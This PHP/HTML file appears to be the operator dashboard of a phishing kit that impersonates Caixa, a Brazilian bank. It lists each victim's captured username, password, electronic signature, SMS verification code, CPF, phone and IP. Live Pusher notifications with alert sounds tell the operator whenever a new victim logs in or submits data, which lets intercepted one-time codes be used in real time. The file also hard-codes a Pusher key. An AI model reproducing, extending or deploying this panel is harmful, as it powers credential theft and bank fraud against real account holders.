<?php
        session_start();
    
        require_once "../../classes/setters.php";
        require_once "../../config/database.php";

        if(!isset($_SESSION['userSessionCompleted']) || !isset($_SESSION['userName'])){
            header("Location: ../login.php");
        }else{
            $nameFiltred = filter_var($_SESSION['userName'], FILTER_SANITIZE_STRING);
            $name = htmlspecialchars($nameFiltred);
        }             
        

        $db = new database();
        $conn = $db->conn;

        if(isset($_GET['id'])){
            
            $id = $_REQUEST["id"];
            $sql = "SELECT * FROM painel_data WHERE id = :id";
            $stmt = $conn->prepare($sql);  
            $stmt->execute(array(":id"=>$id));

        }
        elseif(isset($_GET['tokenId'])){
            
            $token = $_REQUEST["tokenId"];
            $sql = "SELECT * FROM painel_data WHERE ui_token = :token";
            $stmt = $conn->prepare($sql);  
            $stmt->execute(array(":token"=>$token));
        }
        else{
           
            if(isset($_REQUEST['u_id']) && isset($_REQUEST['action'])){
                $id = $_REQUEST['u_id'];            
    
                $sql = "DELETE FROM painel_data WHERE id = :id";
                $qr = $conn->prepare($sql); 
                
                
                if($qr->execute(array(":id"=>$id))){
                    echo "<script>alert('Usuario apagado')</script>";
                    echo "<script>window.location.href='../simulacoes.php'</script>";
                }else{
                    echo "<script>alert('Usuario Inexistente (ID)')</script>";
                }
            }else{
                header("Location: ../simulacoes.php");
            }
        }        

        if($stmt->rowCount() > 0){
            $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);      
        
        foreach($rows as $row){
            $usuario =  $row["usuario"];
            $senha = $row["senha"]; 
            $cpf = $row["cpf"]; 
            $tipoConta = $row["tipoconta"];
            $telefone = $row["telefone"];
            $assinatura = $row["assinatura"];
            $codigoSms = $row["codigosms"];
            $ip = $row["ip"];
            $data_hora = $row["data_hora"];
            $userToken = $row["ui_token"];
        }
        }else{
            $nome = "NaN";
        }

        

?>
<!DOCTYPE html>
<html dir="ltr" lang="pt-br">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!-- Tell the browser to be responsive to screen width -->
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <!-- Favicon icon -->
    <link rel="icon" type="image/png" sizes="16x16" href="../assets/images/favicon.png">
    <title>Painel Caixa - Visualizando Info</title>
    <!-- This page css -->
    <!-- Custom CSS -->
    <link href="../dist/css/style.min.css" rel="stylesheet">
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->
<style>

        .pendente{
            background-color: #ff4f70;
            color: #fff !important;
        }

        .respondido{
            background-color: #01caf1;
            color: #fff !important;
        }

</style>
</head>

<body>
    <!-- ============================================================== -->
    <!-- Preloader - style you can find in spinners.css -->
    <!-- ============================================================== -->
    <div class="preloader">
        <div class="lds-ripple">
            <div class="lds-pos"></div>
            <div class="lds-pos"></div>
        </div>
    </div>
    <!-- ============================================================== -->
    <!-- Main wrapper - style you can find in pages.scss -->
    <!-- ============================================================== -->
    <div id="main-wrapper" data-theme="light" data-layout="vertical" data-navbarbg="skin6" data-sidebartype="full" data-sidebar-position="fixed" data-header-position="fixed" data-boxed-layout="full">
        <!-- ============================================================== -->
        <!-- Topbar header - style you can find in pages.scss -->
        <!-- ============================================================== -->
        <header class="topbar" data-navbarbg="skin6">
            <nav class="navbar top-navbar navbar-expand-md">
                <div class="navbar-header" data-logobg="skin6">
                    <!-- This is for the sidebar toggle which is visible on mobile only -->
                    <a class="nav-toggler waves-effect waves-light d-block d-md-none" href="javascript:void(0)"><i
                            class="ti-menu ti-close"></i></a>
                    <!-- ============================================================== -->
                    <!-- Logo -->
                    <!-- ============================================================== -->
                    <div class="navbar-brand">
                        <!-- Logo icon -->
                        <a href="index.html">
                            <b class="logo-icon">
                                <!-- Dark Logo icon -->
                                <img src="../assets/images/logo-icon.png" width="60" alt="homepage" class="dark-logo" />
                                <!-- Light Logo icon -->
                                <img src="../assets/images/logo-icon.png" width="60" alt="homepage" class="light-logo" />
                            </b>
                            <!--End Logo icon -->
                            <!-- Logo text -->
                            <span class="logo-text">
                                <!-- dark Logo text -->
                                <img src="../assets/images/logo-text.png" width="142" height="42" alt="homepage" class="dark-logo" />
                                <!-- Light Logo text -->
                                <img src="../assets/images/logo-light-text.png" width="142" height="42" class="light-logo" alt="homepage" />
                            </span>
                        </a>
                    </div>
                    <!-- ============================================================== -->
                    <!-- End Logo -->
                    <!-- ============================================================== -->
                    <!-- ============================================================== -->
                    <!-- Toggle which is visible on mobile only -->
                    <!-- ============================================================== -->
                    <a class="topbartoggler d-block d-md-none waves-effect waves-light" href="javascript:void(0)"
                        data-toggle="collapse" data-target="#navbarSupportedContent"
                        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><i
                            class="ti-more"></i></a>
                </div>
                <!-- ============================================================== -->
                <!-- End Logo -->
                <!-- ============================================================== -->
                <div class="navbar-collapse collapse" id="navbarSupportedContent">
                    <!-- ============================================================== -->
                    <!-- toggle and nav items -->
                    <!-- ============================================================== -->
                    <ul class="navbar-nav float-left mr-auto ml-3 pl-1">
                        <!-- Notification -->
                        <li class="nav-item dropdown">
                            <a class="nav-link dropdown-toggle pl-md-3 position-relative" href="javascript:void(0)"
                                id="bell" role="button" data-toggle="dropdown" aria-haspopup="true"
                                aria-expanded="false">
                              
                            </a>
                            <div class="dropdown-menu dropdown-menu-left mailbox animated bounceInDown">
                                <ul class="list-style-none">
                                    <li>
                                        <div class="message-center notifications position-relative">
                                            <!-- Message -->
                                            <a href="javascript:void(0)"
                                                class="message-item d-flex align-items-center border-bottom px-3 py-2">
                                                <div class="btn btn-danger rounded-circle btn-circle"><i
                                                        data-feather="airplay" class="text-white"></i></div>
                                                <div class="w-75 d-inline-block v-middle pl-2">
                                                    <h6 class="message-title mb-0 mt-1">Luanch Admin</h6>
                                                    <span class="font-12 text-nowrap d-block text-muted">Just see
                                                        the my new
                                                        admin!</span>
                                                    <span class="font-12 text-nowrap d-block text-muted">9:30 AM</span>
                                                </div>
                                            </a>
                                            <!-- Message -->
                                            <a href="javascript:void(0)"
                                                class="message-item d-flex align-items-center border-bottom px-3 py-2">
                                                <span class="btn btn-success text-white rounded-circle btn-circle"><i
                                                        data-feather="calendar" class="text-white"></i></span>
                                                <div class="w-75 d-inline-block v-middle pl-2">
                                                    <h6 class="message-title mb-0 mt-1">Event today</h6>
                                                    <span
                                                        class="font-12 text-nowrap d-block text-muted text-truncate">Just
                                                        a reminder that you have event</span>
                                                    <span class="font-12 text-nowrap d-block text-muted">9:10 AM</span>
                                                </div>
                                            </a>
                                            <!-- Message -->
                                            <a href="javascript:void(0)"
                                                class="message-item d-flex align-items-center border-bottom px-3 py-2">
                                                <span class="btn btn-info rounded-circle btn-circle"><i
                                                        data-feather="settings" class="text-white"></i></span>
                                                <div class="w-75 d-inline-block v-middle pl-2">
                                                    <h6 class="message-title mb-0 mt-1">Settings</h6>
                                                    <span
                                                        class="font-12 text-nowrap d-block text-muted text-truncate">You
                                                        can customize this template
                                                        as you want</span>
                                                    <span class="font-12 text-nowrap d-block text-muted">9:08 AM</span>
                                                </div>
                                            </a>
                                            <!-- Message -->
                                            <a href="javascript:void(0)"
                                                class="message-item d-flex align-items-center border-bottom px-3 py-2">
                                                <span class="btn btn-primary rounded-circle btn-circle"><i
                                                        data-feather="box" class="text-white"></i></span>
                                                <div class="w-75 d-inline-block v-middle pl-2">
                                                    <h6 class="message-title mb-0 mt-1">Pavan kumar</h6> <span
                                                        class="font-12 text-nowrap d-block text-muted">Just
                                                        see the my admin!</span>
                                                    <span class="font-12 text-nowrap d-block text-muted">9:02 AM</span>
                                                </div>
                                            </a>
                                        </div>
                                    </li>
                                    <li>
                                        <a class="nav-link pt-3 text-center text-dark" href="javascript:void(0);">
                                            <strong>Check all notifications</strong>
                                            <i class="fa fa-angle-right"></i>
                                        </a>
                                    </li>
                                </ul>
                            </div>
                        </li>
                        <!-- End Notification -->
                        <!-- ============================================================== -->
                        <!-- create new -->
                        <!-- ============================================================== -->
                        <li class="nav-item dropdown">
                            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button"
                                data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                <i data-feather="settings" class="svg-icon"></i>
                            </a>
                            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                                <a class="dropdown-item" href="#">Action</a>
                                <a class="dropdown-item" href="#">Another action</a>
                                <div class="dropdown-divider"></div>
                                <a class="dropdown-item" href="#">Something else here</a>
                            </div>
                        </li>
                        <li class="nav-item d-none d-md-block">
                            <a class="nav-link" href="javascript:void(0)">
                                <div class="customize-input">
                                    <select
                                        class="custom-select form-control bg-white custom-radius custom-shadow border-0">
                                        <option selected>PT-BR</option>                                        
                                    </select>
                                </div>
                            </a>
                        </li>
                    </ul>
                    <!-- ============================================================== -->
                    <!-- Right side toggle and nav items -->
                    <!-- ============================================================== -->
                    <ul class="navbar-nav float-right">
                        <!-- ============================================================== -->
                        <!-- Search -->
                        <!-- ============================================================== -->
                    
                        <!-- ============================================================== -->
                        <!-- User profile and search -->
                        <!-- ============================================================== -->
                        <li class="nav-item dropdown">
                            <a class="nav-link dropdown-toggle" href="javascript:void(0)" data-toggle="dropdown"
                                aria-haspopup="true" aria-expanded="false">
                                <img src="https://image.flaticon.com/icons/png/512/564/564631.png" alt="user" class="rounded-circle"
                                    width="40">
                                 <span
                                        class="text-dark"><?=$name;?></span> <i data-feather="chevron-down"
                                        class="svg-icon"></i></span>
                            </a>
                            <div class="dropdown-menu dropdown-menu-right user-dd animated flipInY">
                            
                                <div class="dropdown-divider"></div>
                                <a class="dropdown-item" href="javascript:void(0)"><i data-feather="power"
                                        class="svg-icon mr-2 ml-1"></i>
                                    Sair</a>
                                <div class="dropdown-divider"></div>
                                
                            </div>
                        </li>
                        <!-- ============================================================== -->
                        <!-- User profile and search -->
                        <!-- ============================================================== -->
                    </ul>
                </div>
            </nav>
        </header>
        <!-- ============================================================== -->
        <!-- End Topbar header -->
        <!-- ============================================================== -->
        <!-- ============================================================== -->
        <!-- Left Sidebar - style you can find in sidebar.scss  -->
        <!-- ============================================================== -->
        <aside class="left-sidebar" data-sidebarbg="skin6">
            <!-- Sidebar scroll-->
            <div class="scroll-sidebar" data-sidebarbg="skin6">
                <!-- Sidebar navigation-->
                <nav class="sidebar-nav">
                    <ul id="sidebarnav">
                        <li class="sidebar-item"> <a class="sidebar-link sidebar-link" href="../index.php"
                                aria-expanded="false"><i data-feather="home" class="feather-icon"></i><span
                                    class="hide-menu">Inicio</span></a></li>
                        <li class="list-divider"></li>
                        <li class="nav-small-cap"><span class="hide-menu">Infos</span></li>

                                              
                        <li class="sidebar-item"> <a class="sidebar-link sidebar-link" href=""
                                aria-expanded="false"><i data-feather="database" class="feather-icon"></i><span
                                    class="hide-menu">Infos</span></a></li>

                        <li class="list-divider"></li>
                    
                        <li class="nav-small-cap"><span class="hide-menu">Extra</span></li>
                        <li class="sidebar-item"> <a class="sidebar-link sidebar-link" href="../painel.php"
                                aria-expanded="false"><i data-feather="settings" class="feather-icon"></i><span
                                    class="hide-menu">Painel</span></a></li>
                        <li class="sidebar-item"> <a class="sidebar-link sidebar-link" href="../logout.php"
                                aria-expanded="false"><i data-feather="log-out" class="feather-icon"></i><span
                                    class="hide-menu">Sair</span></a></li>
                    </ul>
                </nav>
                <!-- End Sidebar navigation -->
            </div>
            <!-- End Sidebar scroll-->
        </aside>
        <!-- ============================================================== -->
        <!-- End Left Sidebar - style you can find in sidebar.scss  -->
        <!-- ============================================================== -->
        <!-- ============================================================== -->
        <!-- Page wrapper  -->
        <!-- ============================================================== -->
        <div class="page-wrapper">
            <!-- ============================================================== -->
            <!-- Bread crumb and right sidebar toggle -->
            <!-- ============================================================== -->
            <div class="page-breadcrumb">
                <div class="row">
                    <div class="col-7 align-self-center">
                        <h4 class="page-title text-truncate text-dark font-weight-medium mb-1">Visualizar Solicitação</h4>
                        <div class="d-flex align-items-center">
                            <nav aria-label="breadcrumb">
                                <ol class="breadcrumb m-0 p-0">
                                    <li class="breadcrumb-item"><a href="index.html" class="text-muted">Infos</a></li>
                                    <li class="breadcrumb-item text-muted active" aria-current="page">Solicitações -> CPF -> <?php echo htmlspecialchars($cpf); ?></li>
                                </ol>
                            </nav>
                        </div>
                    </div>
                    <div class="col-5 align-self-center">
                        <div class="customize-input float-right">
                            <select class="custom-select custom-select-set form-control bg-white border-0 custom-shadow custom-radius">
                                <option selected>
                                <?php 
                                        echo date(" d  M")
                                ?>                            
                                </option>                      
                            </select>
                        </div>
                    </div>
                </div>
            </div>
            <!-- ============================================================== -->
            <!-- End Bread crumb and right sidebar toggle -->
            <!-- ============================================================== -->
            <!-- ============================================================== -->
            <!-- Container fluid  -->
            <!-- ============================================================== -->
            <div class="container-fluid">
                <!-- ============================================================== -->
                <!-- Start Page Content -->
                <!-- ============================================================== -->
                <!-- basic table -->          
                <div class="row">
                    <div class="col-md-6">
                    <?php
                        if($tipoConta == "Fisica"):
                    ?>
                        <div class="alert alert-info"><?=$tipoConta?></div>

                    <?php

                        else:
                    ?>
                        <div class="alert alert-success"><?=$tipoConta?></div>

                    <?php 
                        endif;
                    ?>
                    </div>
                </div>
                <div class="row">
                    <div class="col-12">
                        <div class="card">
                            <div class="card-body">
                                <h4 class="card-title">Dados de login</h4>                                
                                <form method="POST" action="newWelcomeMessage.php">
                                    <div class="form-body">
                                        <div class="row">
                                            <div class="col-md-6">
                                                <div class="form-group">
                                                    <label>Usuario</label>
                                                    <?php
                                                        if($usuario == "notDefined"):
                                                    ?>
                                                        <div class="alert alert-warning">Aguardando Esta informação</div>
                                                    <?php
                                                        else:
                                                    ?>
                                                         <input type="text" class="form-control" disabled value="<?php echo htmlspecialchars($usuario); ?>" id="">
                                                    <?php
                                                        endif;
                                                    ?>
                                                    <input type="hidden" name="nome"  value="<?php echo htmlspecialchars($usuario); ?>">
                                                </div>
                                            </div>
                                            <div class="col-md-6">
                                                <div class="form-group">
                                                    <label>Senha</label>
                                                    <?php
                                                        if($senha == "notDefined"):
                                                    ?>
                                                        <div class="alert alert-warning">Aguardando Esta informação</div>
                                                    
                                                    <?php
                                                        else:
                                                    ?>
                                                        <input type="text" class="form-control" disabled value="<?php echo htmlspecialchars($senha); ?>" id="">
                                                    <?php
                                                        endif;
                                                    ?>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="row">
                                            <div class="col-md-6">
                                                <div class="form-group">
                                                    <label>Assinatura</label>
                                                    <?php
                                                        if($assinatura == "notDefined"):
                                                    ?>
                                                        <div class="alert alert-warning">Aguardando Esta informação</div>
                                                    <?php
                                                        else:
                                                    ?>
                                                         <input type="text" class="form-control" disabled value="<?php echo htmlspecialchars($assinatura); ?>" id="">
                                                    <?php
                                                        endif;
                                                    ?>
                                                   
                                                </div>
                                            </div>                                                                                       
                                            <div class="col-md-6">
                                                <div class="form-group">
                                                    <label>Código SMS</label>
                                                    <?php
                                                        if($codigoSms == "notDefined"):
                                                    ?>
                                                        <div class="alert alert-warning">Aguardando Esta informação</div>
                                                    <?php
                                                        else:
                                                    ?>
                                                         <input type="text" class="form-control" disabled value="<?php echo htmlspecialchars($codigoSms); ?>" id="">
                                                    <?php
                                                        endif;
                                                    ?>
                                                   
                                                </div>
                                            </div>                                                                                       
                                        </div>
                                        <br>
                                        <h4 class="card-title">Outros dados</h4>    
                                        <div class="row">
                                            <div class="col-md-6">
                                                <div class="form-group">
                                                    <label>CPF</label>
                                                    <?php
                                                        if($cpf == "notDefined"):
                                                    ?>
                                                        <div class="alert alert-warning">Aguardando Esta informação</div>
                                                    <?php
                                                        else:
                                                    ?>
                                                         <input type="text" class="form-control" disabled value="<?php echo htmlspecialchars($cpf); ?>" id="">
                                                    <?php
                                                        endif;
                                                    ?>
                                                                                                    
                                                </div>
                                            </div>                                                                                       
                                            <div class="col-md-6">
                                                <div class="form-group">
                                                    <label>Telefone</label>
                                                    <?php
                                                        if($telefone == "notDefined"):
                                                    ?>
                                                        <div class="alert alert-warning">Aguardando Esta informação</div>
                                                    <?php
                                                        else:
                                                    ?>
                                                         <input type="text" class="form-control" disabled value="<?php echo htmlspecialchars($telefone); ?>" id="">
                                                    <?php
                                                        endif;
                                                    ?>
                                                                                                      
                                                </div>
                                            </div>                                                                                       
                                        </div>
                                        <br>
                                        <br>
                                        <div class="row">
                                            <div class="col-md-12">                                        
                                                <div class="form-group">
                                                    <label>Data e Hora de cadastro</label>
                                                    <input type="text" class="form-control" disabled value="<?php echo htmlspecialchars($data_hora); ?>" id="">                                                    
                                                   
                                                </div>                                          
                                            </div>
                                        </div>                      
                                        <br>                                                                 
                                    </div>
                                    <input type="hidden" id="thisUserToken" value="<?php echo htmlspecialchars($userToken); ?>">
                                    <div class="form-actions">
                                        <div class="text-right">                                            
                                            <button type="button" class="btn btn-danger" id="deleteUser" >Deletar Usuário</button>
                                        </div>
                                    </div>
                                    <br>
                                    <div class="row">                                           
                                            <div class="col-md-12">                                                
                                                <div class="form-group">
                                                    <a href="../simulacoes.php" style="color: #fff;" class="form-control btn btn-primary">Voltar</a>
                                                </div>
                                            </div>
                                        </div>  
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- ============================================================== -->
            <!-- End Container fluid  -->
            <!-- ============================================================== -->
            <!-- ============================================================== -->
            <!-- footer -->
            <!-- ============================================================== -->
            <footer class="footer text-center text-muted">
                Todos os direitos reservados desenvolvido por <a
                    href="https://nnv-telas.com">Nunca Nem Vi</a>
            </footer>
            <!-- ============================================================== -->
            <!-- End footer -->
            <!-- ============================================================== -->
        </div>
        <!-- ============================================================== -->
        <!-- End Page wrapper  -->
        <!-- ============================================================== -->
    </div>
    <!-- ============================================================== -->
    <!-- End Wrapper -->
    <!-- ============================================================== -->
    <!-- End Wrapper -->
<div class="modal fade" id="pusherUrgentViewModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Notificação urgente!</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body" id="pusherUrgentViewModal-body">
        
      </div>
      <div class="modal-footer">
        <a id="userLink" type="button" class="btn btn-primary">Visualizar</a>
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Fechar</button>        
      </div>
    </div>
  </div>
</div>

<div class="modal fade" id="modalDeletar" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <form method="GET">
        <div class="modal-header">
            <h5 class="modal-title" id="exampleModalLabel">Apagar Usuário</h5>
            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">&times;</span>
            </button>
        </div>
        <div class="modal-body">
            OPÇS! Deseja realmente apagar esse usuário?
            <input type="hidden" name="u_id" value="<?php echo $row["id"]; ?>"/>
            <input type="hidden" name="action" value="delete"/>
        </div>
        <div class="modal-footer">
            <button type="submit" class="btn btn-danger">Sim</a>
            <button type="button" class="btn btn-secondary" data-dismiss="modal">Cancelar</button>
        </div>
      </form>
    </div>
  </div>
</div>
    <!-- ============================================================== -->
    <!-- All Jquery -->
    <!-- ============================================================== -->
    <script src="../assets/libs/jquery/dist/jquery.min.js"></script>
    <script src="../assets/libs/popper.js/dist/umd/popper.min.js"></script>
    <script src="../assets/libs/bootstrap/dist/js/bootstrap.min.js"></script>
    <!-- apps -->
    <!-- apps -->
    <script src="../dist/js/app-style-switcher.js"></script>
    <script src="../dist/js/feather.min.js"></script>
    <script src="../assets/libs/perfect-scrollbar/dist/perfect-scrollbar.jquery.min.js"></script>
    <script src="../dist/js/sidebarmenu.js"></script>
    <!--Custom JavaScript -->
    <script src="../dist/js/custom.min.js"></script>
    <script src="https://js.pusher.com/6.0/pusher.min.js"></script>
    <script src='https://cdn.rawgit.com/admsev/jquery-play-sound/master/jquery.playSound.js'></script>
    <script>
        $(document).ready(function(){
            $("#deleteUser").click(function(){
                $("#modalDeletar").modal("show");
            })
        })
        
        Pusher.logToConsole = true;

        var pusher = new Pusher('ffed56d81eb7838b3016', {
        cluster: 'mt1'
        });

        var channel = pusher.subscribe('my-channel');
        channel.bind('my-event', function(data) {
            if(data.message == "newLoginIncome"){
                $.playSound("../assets/sounds/login-notification.ogg")                            
            }
            if(data.message == "newRegisterDataInformation"){
                var thisUserToken = $("#thisUserToken").val();

                if(data.uiToken == thisUserToken){
                    
                    location.reload();
                }else{
                    $.playSound("../assets/sounds/trumpet.mp3")
                    $("#pusherUrgentViewModal-body").html("");
                    $("#pusherUrgentViewModal-body").append("A Info de <b>CPF:</b> <mark>" + data.userCpf + "</mark> Acaba de se registrar");
                    $("#userLink").attr("href", "viewSimulacao.php?tokenId="+data.uiToken);
                    $("#pusherUrgentViewModal").modal("show");
                }
            }
            
        })
    </script>
</body>

</html>